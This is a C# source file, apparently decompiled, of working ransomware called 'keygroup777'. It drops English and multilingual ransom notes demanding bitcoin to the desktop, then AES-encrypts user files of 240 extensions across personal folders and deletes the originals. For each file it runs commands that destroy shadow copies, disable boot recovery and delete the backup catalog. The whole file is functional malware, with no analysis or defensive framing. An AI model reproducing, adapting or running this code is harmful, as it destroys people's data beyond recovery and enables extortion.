using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Ransomware;

internal class Program
{
	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_SENDWININICHANGE = 2;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	private static void Main(string[] args)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string contents = "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj.\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35";
		File.WriteAllText(Path.Combine(folderPath, "info.txt"), contents);
		string contents2 = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Keygroup Decryptor 2.0</title>\r\n<style>\r\nbody {\r\n  background-color: #c00;\r\n  color: #fff;\r\n  font-family: sans-serif;\r\n}\r\n\r\n.container {\r\n  display: flex;\r\n  justify-content: center;\r\n  align-items: center;\r\n  height: 100vh;\r\n}\r\n\r\n.card {\r\n  background-color: #f00;\r\n  padding: 20px;\r\n  border-radius: 5px;\r\n  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);\r\n  width: 600px;\r\n}\r\n\r\nh1 {\r\n  text-align: center;\r\n  margin-bottom: 20px;\r\n}\r\n\r\n.countdown {\r\n  background-color: #fff;\r\n  color: #000;\r\n  font-size: 24px;\r\n  padding: 10px;\r\n  border-radius: 5px;\r\n  margin-bottom: 20px;\r\n  text-align: center;\r\n}\r\n\r\n.button {\r\n  background-color: #000;\r\n  color: #fff;\r\n  padding: 10px 20px;\r\n  border: none;\r\n  border-radius: 5px;\r\n  cursor: pointer;\r\n  font-size: 16px;\r\n  margin-right: 10px;\r\n}\r\n\r\n.button:hover {\r\n  opacity: 0.8;\r\n}\r\n\r\n.bitcoin-address {\r\n  background-color: #fff;\r\n  color: #000;\r\n  font-size: 16px;\r\n  padding: 10px;\r\n  border-radius: 5px;\r\n  margin-bottom: 20px;\r\n}\r\n\r\n.bitcoin-logo {\r\n  width: 50px;\r\n  height: 50px;\r\n  margin-right: 10px;\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n  <div class=\"card\">\r\n    <h1 id=\"title\">Oops, your files have been encrypted!</h1>\r\n    <h2 id=\"whatHappened\">Что случилось с моим компьютером?</h2>\r\n    <p id=\"filesEncrypted\">Ваши важные файлы зашифрованы.</p>\r\n    <p id=\"details\">Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...</p>\r\n    <h2 id=\"recoverFiles\">Можно ли восстановить файлы?</h2>\r\n    <p id=\"guarantee\">Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.</p>\r\n    <p id=\"freeDecrypt\">Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать \"<span style=\"color:blue;\">Decrypt</span>\".</p>\r\n    <p id=\"paymentNeed\">Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.</p>\r\n    <p id=\"timeLimit\">У вас есть только 3 дня, чтобы отправить платеж...</p>\r\n    <h2 id=\"howToPay\">Как мне оплатить?</h2>\r\n    <p id=\"paymentMethod\">Оплата принимается только в биткоинах...</p>\r\n    <div class=\"bitcoin-address\" id=\"bitcoinAddress\">\r\n      3MVvvtDHaMTEgMUVnTLoL3k36iFTcow9jj\r\n    </div>\r\n    <button class=\"button\" onclick=\"copyAddress()\">Copy</button>\r\n    <div class=\"countdown\" id=\"timer\">\r\n      Time Left: <span id=\"countdown\">02:23:00</span>\r\n    </div>\r\n    <button class=\"button\" onclick=\"window.location.href='https://ru.wikipedia.org/wiki/Биткойн'\">About bitcoin</button>\r\n    <button class=\"button\" onclick=\"window.location.href='https://ababa1ds.github.io/keygroup777/'\">Decrypt</button>\r\n    \r\n    <div>\r\n      <button class=\"button\" onclick=\"changeLanguage('ru')\">Русский</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('be')\">Беларуский</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('zh')\">中文</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('es')\">Español</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ku')\">Kreyòl Ayisyen</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('my')\">မ\u103cန\u103aမ\u102c</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('sy')\">سورية</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('er')\">ኢርትራ</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ni')\">Nicaragua</button>\r\n      <button class=\"button\" onclick=\"changeLanguage('ve')\">Venezuela</button>\r\n    </div>\r\n  </div>\r\n</div>\r\n\r\n<script>\r\nfunction copyAddress() {\r\n  var copyText = document.querySelector('.bitcoin-address').textContent;\r\n  navigator.clipboard.writeText(copyText)\r\n    .then(() => {\r\n      alert(\"Адрес скопирован в буфер обмена!\");\r\n    })\r\n    .catch(err => {\r\n      console.error(\"Failed to copy: \", err);\r\n    });\r\n}\r\n\r\nlet countdownTime = 10800; // 3 часа в секундах\r\nconst countdownElement = document.getElementById('countdown');\r\n\r\nfunction startTimer() {\r\n  const interval = setInterval(() => {\r\n    if (countdownTime <= 0) {\r\n      clearInterval(interval);\r\n      countdownElement.textContent = \"Время истекло!\";\r\n      return;\r\n    }\r\n    countdownTime--;\r\n    const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');\r\n\r\n    const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');\r\n    const seconds = String(countdownTime % 60).padStart(2, '0');\r\n    countdownElement.textContent = `${hours}:${minutes}:${seconds}`;\r\n  }, 1000);\r\n}\r\n\r\nstartTimer();\r\n\r\nfunction changeLanguage(lang) {\r\n  const texts = {\r\n    ru: {\r\n      title: \"Упс, ваши файлы были зашифрованы!\",\r\n      whatHappened: \"Что случилось с моим компьютером?\",\r\n      filesEncrypted: \"Ваши важные файлы зашифрованы.\",\r\n      details: \"Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны...\",\r\n      recoverFiles: \"Можно ли восстановить файлы?\",\r\n      guarantee: \"Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас не так много времени.\",\r\n      freeDecrypt: \"Вы можете расшифровать некоторые свои файлы бесплатно. Попробуйте нажать 'Decrypt'.\",\r\n      paymentNeed: \"Но если вы хотите расшифровать все свои файлы, вам нужно заплатить.\",\r\n      timeLimit: \"У вас есть только 3 дня, чтобы отправить платеж...\",\r\n      howToPay: \"Как мне оплатить?\",\r\n      paymentMethod: \"Оплата принимается только в биткоинах...\",\r\n    },\r\n    be: {\r\n      title: \"Ой, вашы файлы зашыфраваны!\",\r\n      whatHappened: \"Што здарылася з маім камп'ютэрам?\",\r\n      filesEncrypted: \"Вашы важныя файлы зашыфраваны.\",\r\n      details: \"Многія з вашых дакументаў, фотаздымкаў, відэа, баз даных і іншых файлаў больш недаступныя...\",\r\n      recoverFiles: \"Ці магу я аднавіць файлы?\",\r\n      guarantee: \"Канешне. Мы гарантуем, што вы зможаце бяспечна і лёгка аднавіць усе свае файлы. Але ў вас не так шмат часу.\",\r\n      freeDecrypt: \"Вы можаце расшыфраваць некаторыя з сваіх файлаў бясплатна. Спробуйце націснуць 'Decrypt'.\",\r\n      paymentNeed: \"Але калі вы хочаце расшыфраваць усе свае файлы, вам трэба заплаціць.\",\r\n      timeLimit: \"У вас ёсць толькі 3 дні, каб даслаць плацеж...\",\r\n      howToPay: \"Як мне заплаціць?\",\r\n      paymentMethod: \"Аплата прымаецца толькі ў біткойнах...\",\r\n    },\r\n    zh: {\r\n      title: \"哎呀，您的文件已经被加密！\",\r\n      whatHappened: \"我的电脑发生了什么？\",\r\n      filesEncrypted: \"您的重要文件已被加密。\",\r\n      details: \"您的许多文档、照片、视频、数据库和其他文件都无法访问......\",\r\n      recoverFiles: \"我可以恢复文件吗？\",\r\n      guarantee: \"当然。我们保证您可以安全轻松地恢复所有文件。但是，您没有多少时间。\",\r\n      freeDecrypt: \"您可以免费解密某些文件。尝试点击“Decrypt”。\",\r\n      paymentNeed: \"但如果您想解密所有文件，您需要支付。\",\r\n      timeLimit: \"您只有3天的时间进行付款......\",\r\n      howToPay: \"我该如何支付？\",\r\n      paymentMethod: \"仅接受比特币付款......\",\r\n    },\r\n    es: {\r\n      title: \"¡Oops, sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué ocurrió con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes están cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Se pueden recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, necesitará pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo puedo pagar?\",\r\n      paymentMethod: \"El pago se acepta solo en bitcoins...\",\r\n    },\r\n    ku: {\r\n      title: \"Baxî, pelan we hatine şifrkirin!\",\r\n      whatHappened: \"Çi bûye bi kompiyutera min?\",\r\n      filesEncrypted: \"Pelên girîng yên we şifrkiriyane.\",\r\n      details: \"Ziyaretiyên belgeyên we, wêne, vîdyo, danegehan û pelên din ne qedîne... \",\r\n      recoverFiles: \"Ma dikarin pelan bigrin?\",\r\n      guarantee: \"Bila. Em piştrast dikin ku hûn dikarin hemû pelên xwe bi ewle û hêsan bigirin. Lê tu pir zor ne bidê.\",\r\n      freeDecrypt: \"Hûn dikarin hinek pelên xwe bi belaş şifre çözüne. Tiştek poçik bikin 'Decrypt'.\",\r\n      paymentNeed: \"Lê ger hûn dixwazin hemû pelên xwe şifre çözün, hûn pêdivî ye ku bişînin.\",\r\n      timeLimit: \"Hûn tenê 3 rojan hene da ku bîmre!\",\r\n      howToPay: \"Çawa ez para bidim?\",\r\n      paymentMethod: \"Tenê bi bitcoin tê qebûl kirin...\",\r\n    },\r\n\r\n    my: {\r\n      title: \"Oops, fail anda telah dienkripsi!\",\r\n      whatHappened: \"Apa yang berlaku kepada komputer saya?\",\r\n      filesEncrypted: \"Fail penting anda telah dienkripsi.\",\r\n      details: \"Banyak dokumen, foto, video, pangkalan data, dan fail lain anda tidak lagi boleh diakses...\",\r\n      recoverFiles: \"Bolehkah saya memulihkan fail?\",\r\n      guarantee: \"Sudah tentu. Kami menjamin bahawa anda dapat memulihkan semua fail anda dengan selamat dan mudah. Tetapi anda tidak mempunyai banyak masa.\",\r\n      freeDecrypt: \"Anda boleh menyahkripsi beberapa fail anda secara percuma. Cuba klik 'Decrypt'.\",\r\n      paymentNeed: \"Tetapi jika anda mahu menyahkripsi semua fail anda, anda perlu membayar.\",\r\n      timeLimit: \"Anda hanya mempunyai 3 hari untuk menghantar bayaran...\",\r\n      howToPay: \"Bagaimana saya perlu membayar?\",\r\n      paymentMethod: \"Pembayaran hanya diterima dalam bitcoin...\",\r\n    },\r\n    sy: {\r\n      title: \"أوبس، لقد تم تشفير ملفاتك!\",\r\n      whatHappened: \"ماذا حدث لجهاز الكمبيوتر الخاص بي؟\",\r\n      filesEncrypted: \"تم تشفير ملفاتك المهمة.\",\r\n      details: \"العديد من مستنداتك وصورك ومقاطع الفيديو وقواعد البيانات والملفات الأخرى لم تعد متاحة...\",\r\n      recoverFiles: \"هل يمكنني استعادة الملفات؟\",\r\n      guarantee: \"بالطبع. نحن نضمن أنك ستتمكن من استعادة جميع ملفاتك بأمان وسهولة. لكن ليس لديك الكثير من الوقت.\",\r\n      freeDecrypt: \"يمكنك فك تشفير بعض ملفاتك مجان\u064bا. حاول الضغط على 'Decrypt'.\",\r\n      paymentNeed: \"لكن إذا كنت تريد فك تشفير جميع ملفاتك، فسيتعين عليك الدفع.\",\r\n      timeLimit: \"لديك 3 أيام فقط لإرسال الدفع...\",\r\n      howToPay: \"كيف أدفع؟\",\r\n      paymentMethod: \"يتم قبول الدفع فقط بالبيتكوين...\",\r\n    },\r\n    er: {\r\n      title: \"እየአዛንክይ ኣመይር፣ ፋይልዎች ቀውም\",\r\n      whatHappened: \"እዚ ፀሐፍ ዲስኑ ወኣእጣጋክየ\",\r\n      filesEncrypted: \"ጊዜሉን ትኽዕልነ ወፋይሎች ተራቢኢ ይዌዐሉ\",\r\n      details: \"ዝይኮይ፡ በይ ዝኽይምየት ገምኒ፣ ሣንሕተን፣ ዳቦት ደቃይየ ሻትዉ>\",\r\n      recoverFiles: \"እንኩየዚ ዊኩር ይዋስዉ ኖల\u0c4bል?\",\r\n      guarantee: \"ወኣሰኴነ ዚ አረየዌ ምባምኩ ያለን ዘሓምሶ:\",\r\n      freeDecrypt: \"ጉዚዘ ኣዘንጭቱዋ ባቀዋክ ዋህዌውነ ይዋስዉ ው 'ምትተክ' ኒ\",\r\n      paymentNeed: \"ጠንኒዚ ከዜናዊ ተድጉብዢ \",\r\n      timeLimit: \"ጵዒ መድእም ከዕዟቀነ ናት ዉላ\",\r\n      howToPay: \"ዝይምቱሃን አውበጥ\",\r\n      paymentMethod: \"ንግዕቲቕ ኈንግሪይዊ ይፅይሉ እይሳነ\",\r\n    },\r\n    ni: {\r\n      title: \"Oops, ¡sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué pasó con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes han sido cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Puedo recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá restaurar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos de forma gratuita. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, deberá pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo debo pagar?\",\r\n      paymentMethod: \"El pago solo se acepta en bitcoin...\",\r\n    },\r\n    ve: {\r\n      title: \"¡Oops, sus archivos han sido cifrados!\",\r\n      whatHappened: \"¿Qué pasó con mi computadora?\",\r\n      filesEncrypted: \"Sus archivos importantes están cifrados.\",\r\n      details: \"Muchos de sus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles...\",\r\n      recoverFiles: \"¿Se pueden recuperar los archivos?\",\r\n      guarantee: \"Por supuesto. Garantizamos que podrá recuperar todos sus archivos de forma segura y fácil. Pero no tiene mucho tiempo.\",\r\n      freeDecrypt: \"Puede descifrar algunos de sus archivos gratis. Intente presionar 'Decrypt'.\",\r\n      paymentNeed: \"Pero si desea descifrar todos sus archivos, necesitará pagar.\",\r\n      timeLimit: \"Solo tiene 3 días para enviar el pago...\",\r\n      howToPay: \"¿Cómo puedo pagar?\",\r\n      paymentMethod: \"El pago se acepta solo en bitcoins...\",\r\n    }\r\n  };\r\n\r\n  const selectedTexts = texts[lang];\r\n  for (const key in selectedTexts) {\r\n    document.getElementById(key).textContent = selectedTexts[key];\r\n  }\r\n}\r\n</script>\r\n</body>\r\n</html>\r\n";
		File.WriteAllText(Path.Combine(folderPath, "info.html"), contents2);
		string[] array = new string[11]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\3D Objects",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Searches",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Favorites",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Contacts",
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
		};
		string[] source = new string[240]
		{
			".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".tgz", ".lzo", ".txt", ".jar",
			".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
			".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql", ".indd", ".cs",
			".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
			".apk", ".lnk", ".dib", ".dic", ".dif", ".mdb", ".php", ".asp", ".aspx", ".html",
			".htm", ".xml", ".psd", ".pdf", ".xla", ".cub", ".dae", ".divx", ".iso", ".7zip",
			".pdb", ".ico", ".pas", ".db", ".wmv", ".swf", ".cer", ".bak", ".backup", ".accdb",
			".bay", ".p7c", ".exif", ".vss", ".raw", ".m4a", ".wma", ".ace", ".arj", ".bz2",
			".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".mpeg", ".torrent", ".mpg", ".core",
			".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb", ".crt", ".xlsm",
			".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps", ".docm", ".wav",
			".3gp", ".gif", ".log", ".gz", ".config", ".vb", ".m1v", ".sln", ".pst", ".obj",
			".xlam", ".djvu", ".inc", ".cvs", ".dbf", ".tbi", ".wpd", ".dot", ".dotx", ".webm",
			".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".onepkg", ".accde",
			".jsp", ".json", ".xltx", ".vsdx", ".uxdc", ".udl", ".3ds", ".3fr", ".3g2", ".accda",
			".accdc", ".accdw", ".adp", ".ai", ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8",
			".arw", ".ascx", ".asm", ".asmx", ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr",
			".pict", ".rgbe", ".dwt", ".f4v", ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf",
			".mdw", ".mht", ".mpv", ".msg", ".myi", ".nef", ".odc", ".geo", ".swift", ".odm",
			".odp", ".oft", ".orf", ".pfx", ".p12", ".pl", ".pls", ".safe", ".tab", ".vbs",
			".xlk", ".xlm", ".xlt", ".xltm", ".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb",
			".tif", ".rss", ".key", ".vob", ".epsp", ".dc3", ".iff", ".opt", ".onetoc2", ".nrw",
			".pptm", ".potx", ".potm", ".pot", ".xlw", ".xps", ".xsd", ".exe", ".xsl", ".kmz",
			".accdr", ".stm", ".accdt", ".ppam", ".pps", ".ppsm", ".1cd", ".p7b", ".wdb", ".sqlite"
		};
		using Aes aes = Aes.Create();
		aes.GenerateKey();
		byte[] key = aes.Key;
		string[] array2 = array;
		foreach (string folder in array2)
		{
			string[] array3 = (from f in source.SelectMany((string ext) => Directory.GetFiles(folder, "*" + ext, SearchOption.AllDirectories))
				where !f.EndsWith("info.txt") && !f.EndsWith("info.html")
				select f).ToArray();
			string[] array4 = array3;
			foreach (string text in array4)
			{
				using (FileStream fileStream = File.Open(text, FileMode.Open))
				{
					byte[] array5 = new byte[fileStream.Length];
					fileStream.Read(array5, 0, array5.Length);
					byte[] array6;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
						cryptoStream.Write(array5, 0, array5.Length);
						cryptoStream.Close();
						array6 = memoryStream.ToArray();
					}
					using FileStream fileStream2 = File.Create(text + ".Keygroup777");
					fileStream2.Write(array6, 0, array6.Length);
				}
				File.Delete(text);
				Process.Start("cmd.exe", "/C vssadmin delete shadows /All /Quiet");
				Process.Start("cmd.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures");
				Process.Start("cmd.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
				Process.Start("cmd.exe", "bcdedit /set {default} recoveryenabled no");
				Process.Start("cmd.exe", "wbadmin delete catalog -quiet");
			}
		}
	}
}
